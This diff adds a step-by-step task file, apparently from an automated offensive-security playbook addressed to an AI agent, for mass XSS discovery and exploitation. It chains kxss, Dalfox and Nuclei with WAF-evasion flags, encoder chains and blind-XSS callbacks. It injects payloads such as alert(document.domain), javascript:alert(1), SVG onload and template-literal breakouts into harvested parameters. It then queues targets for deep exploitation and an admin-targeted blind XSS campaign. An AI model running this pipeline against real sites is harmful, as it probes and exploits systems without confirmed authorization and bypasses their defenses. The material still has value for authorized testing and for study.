@@ -1,0 +1,348 @@
+================================================================================
+TASK 54 · XSS REFLECTION SCANNER (Kxss + Dalfox)
+================================================================================
+Fast triage to find reflection points and auto-exploitable XSS vulnerabilities.
+
+OBJECTIVE:
+- Identify ALL parameters that reflect user input in responses
+- Auto-detect and confirm XSS vulnerabilities with Dalfox
+- Prioritize endpoints for manual exploitation in Task 55
+
+================================================================================
+INPUTS (from previous tasks)
+================================================================================
+outputs/queue_dynamic_endpoints_urls.txt    ← URLs with parameters
+outputs/arjun_found_params.txt              ← Hidden params discovered
+outputs/url_corpus_all_in_scope.txt         ← Full URL corpus
+outputs/live_base_urls.txt                  ← Live hosts
+outputs/waf_fingerprints.txt                ← WAF detection (Task 32)
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/xss_reflections_kxss.txt            ← Reflected params (needs manual)
+outputs/xss_confirmed_dalfox.txt            ← Confirmed XSS vulnerabilities
+outputs/queue_xss_manual_exploitation.txt   ← Queue for Task 55 deep testing
+temp/agent1/xss_scan_targets.txt            ← Prepared target list
+
+================================================================================
+PHASE 1: PREPARE XSS TARGETS
+================================================================================
+Build optimized target list from all parameterized endpoints:
+
+───────────────────────────────────────
+1.1 Extract Parameterized URLs
+───────────────────────────────────────
+# Merge all sources with parameters
+cat outputs/queue_dynamic_endpoints_urls.txt \
+    outputs/arjun_found_params.txt \
+    outputs/url_corpus_all_in_scope.txt \
+    2>/dev/null | grep "?" | sort -u > temp/agent1/xss_all_params.txt
+
+# Count targets
+wc -l temp/agent1/xss_all_params.txt
+
+───────────────────────────────────────
+1.2 Prioritize High-Value Targets
+───────────────────────────────────────
+Parameters most likely to be XSS vulnerable (prioritize these):
+
+# Search/display params (HIGH priority)
+grep -iE "[?&](q|query|search|keyword|s|term|find|lookup|name|title|msg|message|text|content|body|comment|description|input|value|data|user|username|email|url|redirect|return|next|ref|callback|jsonp|template|file|path|page|id|action)=" \
+    temp/agent1/xss_all_params.txt > temp/agent1/xss_high_priority.txt
+
+# Error/debug params (often reflect unescaped)
+grep -iE "[?&](error|err|debug|exception|warning|alert|notice|info|status|result)=" \
+    temp/agent1/xss_all_params.txt >> temp/agent1/xss_high_priority.txt
+
+# Callback/JSONP (common XSS vectors)
+grep -iE "[?&](callback|jsonp|cb|fn|function|handler)=" \
+    temp/agent1/xss_all_params.txt >> temp/agent1/xss_high_priority.txt
+
+# Dedupe high priority
+sort -u temp/agent1/xss_high_priority.txt -o temp/agent1/xss_high_priority.txt
+
+================================================================================
+PHASE 2: KXSS - REFLECTION DETECTION
+================================================================================
+Kxss is FAST - detects if input reflects in response (doesn't confirm XSS).
+
+───────────────────────────────────────
+2.1 Install/Verify Kxss
+───────────────────────────────────────
+# Install if needed
+go install github.com/Emoe/kxss@latest
+
+# Verify
+kxss -h
+
+───────────────────────────────────────
+2.2 Run Kxss on All Targets
+───────────────────────────────────────
+# Run on high priority first
+cat temp/agent1/xss_high_priority.txt | kxss > temp/agent1/kxss_high_raw.txt
+
+# Run on remaining targets
+cat temp/agent1/xss_all_params.txt | kxss > temp/agent1/kxss_all_raw.txt
+
+───────────────────────────────────────
+2.3 Parse Kxss Output
+───────────────────────────────────────
+Kxss output format: URL with reflection indicator
+
+# Extract URLs with confirmed reflections
+grep -i "reflection" temp/agent1/kxss_all_raw.txt | \
+    awk '{print $1}' | sort -u > outputs/xss_reflections_kxss.txt
+
+# Count reflections found
+echo "=== Reflection Points Found ===" 
+wc -l outputs/xss_reflections_kxss.txt
+
+───────────────────────────────────────
+2.4 Reflection Context Analysis
+───────────────────────────────────────
+Analyze WHERE input reflects (context matters for payload):
+
+# Check response for reflection context
+for url in $(head -20 outputs/xss_reflections_kxss.txt); do
+    echo "=== $url ===" >> temp/agent1/reflection_contexts.txt
+    curl -s "$url" | grep -oP '.{0,50}REFLECTED_VALUE.{0,50}' >> temp/agent1/reflection_contexts.txt
+done
+
+Context types to identify:
+- HTML body: <div>REFLECTED</div>           → Standard XSS
+- HTML attribute: value="REFLECTED"         → Break out with "
+- JavaScript: var x = "REFLECTED"           → Break out with ";
+- URL/href: href="REFLECTED"                → javascript: pseudo
+- Event handler: onclick="REFLECTED"        → Already in JS context
+
+================================================================================
+PHASE 3: DALFOX - AUTOMATED XSS SCANNER
+================================================================================
+Dalfox = Best automated XSS scanner. Confirms + exploits reflections.
+
+───────────────────────────────────────
+3.1 Install/Verify Dalfox
+───────────────────────────────────────
+# Install
+go install github.com/hahwul/dalfox/v2@latest
+
+# Verify
+dalfox version
+
+───────────────────────────────────────
+3.2 Dalfox Single URL Mode
+───────────────────────────────────────
+# Test single URL with all features
+dalfox url "https://target.com/search?q=test" \
+    --skip-bav \
+    --waf-evasion \
+    -o temp/agent1/dalfox_single.txt
+
+Useful flags:
+  --skip-bav         Skip BAV (basic auth verification)
+  --waf-evasion      Enable WAF bypass payloads
+  --deep-domxss      Deep DOM XSS analysis
+  --follow-redirects Follow redirects
+  -b CALLBACK_URL    Blind XSS callback (use Interactsh)
+  --mining-dict      Extract params from response
+  -H "Cookie: ..."   Add auth cookie
+
+───────────────────────────────────────
+3.3 Dalfox Pipe Mode (Mass Scanning)
+───────────────────────────────────────
+# Scan all reflection points from Kxss
+cat outputs/xss_reflections_kxss.txt | dalfox pipe \
+    --skip-bav \
+    --waf-evasion \
+    -o temp/agent1/dalfox_pipe_results.txt
+
+# Scan high priority targets
+cat temp/agent1/xss_high_priority.txt | dalfox pipe \
+    --waf-evasion \
+    --deep-domxss \
+    -o temp/agent1/dalfox_high_priority.txt
+
+───────────────────────────────────────
+3.4 Dalfox with Authentication
+───────────────────────────────────────
+# With cookie auth
+cat outputs/xss_reflections_kxss.txt | dalfox pipe \
+    -H "Cookie: session=YOUR_SESSION_COOKIE" \
+    --waf-evasion \
+    -o temp/agent1/dalfox_authed.txt
+
+# With Bearer token
+cat outputs/xss_reflections_kxss.txt | dalfox pipe \
+    -H "Authorization: Bearer YOUR_TOKEN" \
+    --waf-evasion \
+    -o temp/agent1/dalfox_bearer.txt
+
+───────────────────────────────────────
+3.5 Dalfox WAF Bypass Mode
+───────────────────────────────────────
+If WAF detected in Task 40:
+
+# Enable all bypass techniques
+cat outputs/xss_reflections_kxss.txt | dalfox pipe \
+    --waf-evasion \
+    --encoder "url,html,unicode" \
+    --delay 500 \
+    -o temp/agent1/dalfox_waf_bypass.txt
+
+# Custom payload file for specific WAF
+dalfox url "https://target.com/search?q=test" \
+    --custom-payload /path/to/waf_bypass_payloads.txt \
+    -o temp/agent1/dalfox_custom.txt
+
+───────────────────────────────────────
+3.6 Parse Dalfox Results
+───────────────────────────────────────
+# Extract confirmed XSS (POC URLs)
+grep -E "^\[POC\]|^\[V\]" temp/agent1/dalfox_pipe_results.txt | \
+    sort -u > outputs/xss_confirmed_dalfox.txt
+
+# Extract vulnerable parameters
+grep -oP 'param: \K[^\]]+' temp/agent1/dalfox_pipe_results.txt | \
+    sort -u > temp/agent1/xss_vuln_params.txt
+
+================================================================================
+PHASE 4: NUCLEI XSS TEMPLATES
+================================================================================
+
+───────────────────────────────────────
+4.1 Run Nuclei XSS Templates
+───────────────────────────────────────
+# XSS-specific templates
+nuclei -l temp/agent1/xss_all_params.txt \
+    -t ~/nuclei-templates/http/vulnerabilities/xss/ \
+    -t ~/nuclei-templates/dast/vulnerabilities/xss/ \
+    -o temp/agent1/nuclei_xss_results.txt
+
+# Include reflected-xss templates
+nuclei -l outputs/xss_reflections_kxss.txt \
+    -tags xss,reflected \
+    -o temp/agent1/nuclei_xss_tagged.txt
+
+───────────────────────────────────────
+4.2 JSONP Callback XSS
+───────────────────────────────────────
+# JSONP endpoints are often XSS vulnerable
+grep -iE "callback=|jsonp=|cb=" temp/agent1/xss_all_params.txt > temp/agent1/jsonp_endpoints.txt
+
+# Test JSONP XSS
+for url in $(cat temp/agent1/jsonp_endpoints.txt); do
+    base_url=$(echo "$url" | sed 's/callback=[^&]*/callback=alert(document.domain)/')
+    echo "$base_url" >> temp/agent1/jsonp_xss_tests.txt
+done
+
+================================================================================
+PHASE 5: SPECIAL CONTEXTS
+================================================================================
+
+───────────────────────────────────────
+5.1 URL Parameter XSS
+───────────────────────────────────────
+# Test redirect/URL params with javascript:
+grep -iE "[?&](url|redirect|next|return|ref|link|goto|dest|target|redir|continue)=" \
+    temp/agent1/xss_all_params.txt > temp/agent1/url_params.txt
+
+# Test javascript: protocol
+for url in $(cat temp/agent1/url_params.txt | head -50); do
+    param_name=$(echo "$url" | grep -oP '[?&]\K(url|redirect|next|return|ref|link|goto|dest|target|redir|continue)(?==)')
+    test_url=$(echo "$url" | sed "s/${param_name}=[^&]*/${param_name}=javascript:alert(1)/")
+    echo "$test_url" >> temp/agent1/javascript_proto_tests.txt
+done
+
+───────────────────────────────────────
+5.2 SVG/Image XSS
+───────────────────────────────────────
+# If file upload or image URL params exist
+grep -iE "[?&](img|image|src|avatar|photo|picture|icon|file)=" \
+    temp/agent1/xss_all_params.txt > temp/agent1/image_params.txt
+
+# Test SVG XSS
+# Payload: data:image/svg+xml,<svg onload=alert(1)>
+
+───────────────────────────────────────
+5.3 Template Literal XSS (Modern JS)
+───────────────────────────────────────
+# If reflection is in JS template literal: `Hello ${user}`
+# Payload: ${alert(1)}
+
+# Check for template literals in responses
+curl -s "https://target.com/page?user=XSSTEST" | grep -o '`[^`]*XSSTEST[^`]*`'
+
+================================================================================
+PHASE 6: OUTPUT CONSOLIDATION
+================================================================================
+
+───────────────────────────────────────
+6.1 Merge All Confirmed XSS
+───────────────────────────────────────
+cat outputs/xss_confirmed_dalfox.txt \
+    temp/agent1/nuclei_xss_results.txt \
+    2>/dev/null | sort -u > outputs/xss_confirmed_all.txt
+
+───────────────────────────────────────
+6.2 Create Queue for Deep Exploitation
+───────────────────────────────────────
+# URLs that reflect but Dalfox couldn't auto-exploit
+# These need manual testing in Task 55 (XSStrike + manual)
+
+comm -23 <(sort outputs/xss_reflections_kxss.txt) \
+         <(sort outputs/xss_confirmed_dalfox.txt | grep -oP 'https?://[^ ]+' | sort -u) \
+    > outputs/queue_xss_manual_exploitation.txt
+
+echo "=== XSS Scan Summary ===" 
+echo "Reflection points found: $(wc -l < outputs/xss_reflections_kxss.txt)"
+echo "Auto-confirmed XSS: $(wc -l < outputs/xss_confirmed_dalfox.txt)"
+echo "Need manual testing: $(wc -l < outputs/queue_xss_manual_exploitation.txt)"
+
+================================================================================
+🧠 YOU ARE AN INTELLIGENT AGENT 🧠
+================================================================================
+Do NOT just run commands blindly. THINK about each step:
+
+OBSERVE:
+- What does the response look like? HTML? JSON? JavaScript?
+- Is the reflection inside tags, attributes, or script blocks?
+- Is there a WAF blocking payloads?
+
+ANALYZE:
+- Which parameters accept user input and display it?
+- Are special characters (<, >, ", ') being encoded or stripped?
+- Is Content-Type text/html or application/json?
+
+PRIORITIZE:
+- Search boxes and error messages → Usually reflected directly
+- JSONP callbacks → Often vulnerable
+- Debug/admin pages → Less sanitization
+- User profile fields → May have different encoding
+
+ADAPT:
+- If Dalfox fails, the reflection exists but context is tricky
+- HTML encoded? Try attribute breakout or event handlers
+- JS context? Try string escape sequences
+- WAF blocking? Try encoding chains (see Task 55)
+
+REMEMBER:
+- Reflected ≠ Exploitable (context matters)
+- Some XSS only works in specific browsers
+- httpOnly cookies can't be stolen but XSS still dangerous (keylogging, phishing)
+
+================================================================================
+SUCCESS CRITERIA
+================================================================================
+✓ All parameterized endpoints scanned with Kxss
+✓ Reflection points identified and documented
+✓ Dalfox auto-exploitation attempted on all reflections
+✓ Confirmed XSS vulnerabilities with POC URLs
+✓ Queue prepared for manual exploitation (Task 55)
+✓ Context analysis for non-auto-exploitable reflections
+
+================================================================================
+NEXT TASK
+================================================================================
+→ Task 55: XSS Deep Exploitation (XSStrike + manual context-aware payloads)
+→ Task 56: Blind XSS Campaign (XSS Hunter for admin-triggered XSS)
